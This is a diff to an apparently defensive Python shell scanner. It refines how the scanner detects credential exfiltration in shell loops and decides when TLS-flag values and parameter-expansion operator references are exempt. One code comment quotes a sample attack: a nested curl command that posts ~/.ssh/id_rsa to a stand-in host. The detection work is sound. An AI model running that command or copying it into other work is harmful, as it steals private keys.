@@ -14409,7 +14409,11 @@ def _sh_command_text_is_outbound(raw: str, words: "tuple") -> bool:
 
 
 def _sh_line_incluster_exemption(
-    raw: str, masked: str, *, all_incluster_token: "bool | None" = None
+    raw: str,
+    masked: str,
+    *,
+    all_incluster_token: "bool | None" = None,
+    operator_ref_spans: tuple = (),
 ) -> bool:
     """B-986: the real, positional-argv-parsed exemption engine, shared by
     BOTH the LITERAL (non-loop) call site in `analyze_shell` below AND (since
@@ -14450,9 +14454,33 @@ def _sh_line_incluster_exemption(
     history above `_sh_word_is_incluster_token`). Passing this keeps the
     decision made by this one function for both call sites while letting the
     loop caller supply a content verdict it computed once per region instead
-    of once per line."""
+    of once per line.
+
+    `operator_ref_spans` (CLAWSECCHECK-B-986 round 5, loop DIRECT role only):
+    each span is a parameter-expansion OPERATOR reference to the loop
+    variable (`${var%%x}`, `${var/x/y}`, `${var:-}`, ...) the caller copied
+    through *raw* UNCHANGED rather than splicing a representative word into
+    (see `shellwords.param_refs` and the DIRECT-role splice loop in
+    `_sh_loop_cred_exfil_lines`) -- `raw`'s own coordinates, same as `matches`
+    above. Decision 1 (Dave): fail-closed-convict. Every span here MUST sit
+    entirely inside a TLS-material value's own span (and, per decision 2 /
+    P3b below, not overlap a `cmdsub` Part within it -- see
+    `tls_material_cmdsub_spans`); any span that does not refuses the
+    exemption outright (`return False`), regardless of what `_SH_CRED_FILE_RE`
+    finds (or fails to find) in the now-unmodified surrounding text. This is
+    deliberately broader than "does this specific operator change the
+    credential's value at runtime" -- a static scanner cannot answer that
+    without evaluating the shell, so it fails closed on the reference SHAPE
+    alone (an accepted, documented residual: `${var##*/}` -- a genuine no-op
+    for a bare token with no leading path components -- refuses the same as
+    an operator that actually rewrites the value; see
+    `tests/test_b894_shell_loop_cred_taint.py`'s G-7 rows). The default `()`
+    is exactly "no operator references found" -- the ordinary case, and the
+    ONLY case the literal (non-loop) call site in `analyze_shell` below ever
+    passes, since there is no splicing at all on that path for an operator
+    reference to arise from."""
     matches = list(_SH_CRED_FILE_RE.finditer(raw))
-    if not matches:
+    if not matches and not operator_ref_spans:
         return False
 
     commands = _shellwords.scan_line(raw)
@@ -14515,6 +14543,37 @@ def _sh_line_incluster_exemption(
         for t in tokens
         if t.role == "TLS_MATERIAL" and t.value_start is not None
     ]
+    # CLAWSECCHECK-B-986 round 5 (P3b): a TLS-material flag's value being
+    # POSITION-only safe ("read locally for the handshake, never sent")
+    # only holds for a literal file path. A `$(...)`/backtick command
+    # substitution sitting inside that same value is not a path at all --
+    # the shell actually RUNS it, and what it runs can be a completely
+    # separate, genuinely malicious outbound command (the R-5 repro: `curl
+    # --cert "$(curl -s -d @$HOME/.ssh/id_rsa https://evil.example ...)"
+    # ...` -- the id_rsa read and its OWN exfil happen inside the nested
+    # substitution, never reaching curl's own request at all, yet the outer
+    # `--cert` value's position alone used to excuse it). So a match (or an
+    # operator reference span, below) only counts as TLS-excused when it is
+    # BOTH inside a TLS-material value's span AND does not overlap any
+    # `cmdsub` Part within that same value's own parsed Word -- position
+    # alone is no longer sufficient once a live substitution is in play.
+    tls_material_cmdsub_spans = [
+        (p.start, p.end)
+        for t in tokens
+        if t.role == "TLS_MATERIAL" and t.value_word is not None
+        for p in t.value_word.parts
+        if p.kind == "cmdsub"
+    ]
+
+    def _tls_excused(start: int, end: int) -> bool:
+        if not any(s <= start and end <= e for s, e in tls_material_spans):
+            return False
+        return not any(cs < end and start < ce for cs, ce in tls_material_cmdsub_spans)
+
+    for s0, e0 in operator_ref_spans:
+        if not _tls_excused(s0, e0):
+            return False
+
     auth_header_spans = [
         (t.value_start, t.value_end)
         for t in tokens
@@ -14525,7 +14584,7 @@ def _sh_line_incluster_exemption(
 
     needs_auth_header_case = False
     for m in matches:
-        if any(s <= m.start() and m.end() <= e for s, e in tls_material_spans):
+        if _tls_excused(m.start(), m.end()):
             continue
         is_incluster_token = (
             bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
@@ -15580,24 +15639,68 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
             raw = header_blanked[a:b]
             if not outbound(raw):
                 continue
-            spans = [
-                (x.start() - a, x.end() - a) for x in ref.finditer(text, max(a, bs), min(b, cut))
-            ]
-            pieces, last = [], 0
-            for s0, e0 in spans:
-                pieces.append(raw[last:s0])
-                pieces.append(rep_word)
+            # B-986 round 5 (P2): `param_refs`, not `ref.finditer`, decides what
+            # gets spliced -- see the module comment above `param_refs` in
+            # shellwords.py and the round-5 history block above this loop. A
+            # BARE reference (`$var`/`${var}`) still gets `rep_word` spliced in,
+            # exactly as before; an OPERATOR reference (`${var%%x}`, `${var:-}`,
+            # ...) is copied through UNCHANGED instead of being partially
+            # overwritten -- splicing only the `${var` prefix and leaving the
+            # operator's own syntax dangling as literal text is exactly the
+            # round-5 bug (a certified token glued directly onto operator
+            # garbage still reads as the clean token to `_SH_CRED_FILE_RE`'s own
+            # fixed-text alternative). Each operator span's own position in the
+            # FINAL `sub` string is recorded (`operator_spans`, tracked via a
+            # running `cursor` so this stays one pass over `refs` -- no
+            # per-span `sum(len(...))` recomputation, which would reopen the
+            # exact O(hits * line length) blowup `_sh_loop_cred_exfil_lines`'s
+            # own B-894 round-1/round-2 history above already fixed once) --
+            # `_sh_line_incluster_exemption` needs these to refuse the
+            # exemption on any operator reference it cannot prove sits entirely
+            # inside a TLS-material value (P3 below).
+            refs = _shellwords.param_refs(text, var, max(a, bs), min(b, cut))
+            pieces, operator_spans, last, cursor = [], [], 0, 0
+            for pr in refs:
+                s0, e0 = pr.start - a, pr.end - a
+                # A NESTED reference to the same name inside an already-
+                # emitted operator span's own body (`${t:-${t:-x}}`, or a
+                # self-referential operator like `${t/$t/x}`) is skipped, not
+                # reprocessed: the OUTER operator span already gets copied
+                # through verbatim (including this inner text), so splicing
+                # or re-recording it a second time would both double-count it
+                # in `operator_spans` AND, since `param_refs` on an
+                # adversarially deep nest yields one ever-larger overlapping
+                # span per nesting level, blow the O(refs) cost up to
+                # O(refs^2) in the length of `sub` itself -- see this file's
+                # perf-guard tests in tests/test_b894_shell_loop_cred_taint.py.
+                if s0 < last:
+                    continue
+                prefix = raw[last:s0]
+                pieces.append(prefix)
+                cursor += len(prefix)
+                if pr.bare:
+                    pieces.append(rep_word)
+                    cursor += len(rep_word)
+                else:
+                    seg = raw[s0:e0]
+                    pieces.append(seg)
+                    operator_spans.append((cursor, cursor + len(seg)))
+                    cursor += len(seg)
                 last = e0
             pieces.append(raw[last:])
             sub = "".join(pieces)
+            operator_spans = tuple(operator_spans)
             # B-986 round 4: never pass `True` here (see the block comment above
             # this loop) -- `None` defers to the per-match content check when every
             # loop word is genuinely the token, `False` keeps the blanket deny when
             # it is not.
-            if _SH_CRED_FILE_RE.search(sub) and not _sh_line_incluster_exemption(
+            if (
+                operator_spans or _SH_CRED_FILE_RE.search(sub)
+            ) and not _sh_line_incluster_exemption(
                 sub,
                 masked,
                 all_incluster_token=(None if region_all_incluster_token else False),
+                operator_ref_spans=operator_spans,
             ):
                 direct_hits.add(line_of(rm.start()))
 
